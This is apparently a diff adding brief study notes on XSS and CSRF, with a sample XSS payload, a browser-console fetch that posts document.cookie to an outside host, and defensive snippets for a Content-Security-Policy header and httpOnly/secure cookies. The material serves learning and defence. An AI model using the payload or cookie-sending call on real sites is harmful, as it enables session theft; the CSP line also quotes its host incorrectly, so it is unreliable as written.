@@ -1,0 +1,24 @@
+XSS + CSRF
+
+// xss - client side validation by scripts
+<img src="/" onerror="alert(1);">
+
+
+// in console (F12)
+> fetch('//httpbin.org/post', { method: 'POST', body: document.cookie })
+
+
+// set headers
+res.set({
+	'Content-Security-Policy': "script-src 'self' 'https://apis.google.com'"
+})
+
+
+// set cookies
+res.cookie('session', '1', { httpOnly: true})
+res.cookie('session', '1', { secure: true})
+
+
+// exercises
+https://www.hacksplaining.com/exercises/xss-stored
+https://www.hacksplaining.com/exercises/csrf
